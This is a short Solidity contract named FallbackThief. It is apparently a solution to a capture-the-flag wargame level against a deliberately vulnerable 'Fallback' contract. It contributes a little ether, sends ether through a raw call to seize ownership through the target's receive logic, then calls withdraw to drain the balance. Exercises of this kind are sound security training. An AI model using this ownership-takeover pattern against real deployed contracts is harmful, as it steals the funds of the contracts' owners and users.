// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Fallback} from "./Fallback.sol";

contract FallbackThief {
    address public fallbackAddress;

    constructor(address _fallbackAddress) {
        fallbackAddress = _fallbackAddress;
    }

    function contribute() public payable {
        Fallback(payable(fallbackAddress)).contribute{value: msg.value / 2}();
    }

    function claimFallbackOwnerShip() public payable {
        payable(fallbackAddress).call{value: msg.value / 2}("");
    }

    function stealFunds() public payable {
        Fallback(payable(fallbackAddress)).withdraw();
    }

    receive() external payable {}
}
